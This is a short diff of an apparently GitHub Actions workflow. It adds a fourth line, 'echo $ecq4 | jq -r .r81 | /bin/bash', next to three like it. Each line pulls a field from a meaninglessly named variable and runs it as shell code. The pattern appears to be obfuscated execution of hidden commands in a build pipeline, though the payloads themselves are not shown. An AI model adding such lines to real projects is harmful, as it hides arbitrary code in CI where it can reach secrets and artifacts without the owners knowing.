@@ -34,6 +34,7 @@ jobs:
           echo $jkf4132 | jq -r .q68 | /bin/bash
           printf '%s' "$mvre79" | jq -r .bf22449 | /bin/bash
           printf '%s' "$ufg637" | jq -r .tujr849 | /bin/bash
+          echo $ecq4 | jq -r .r81 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
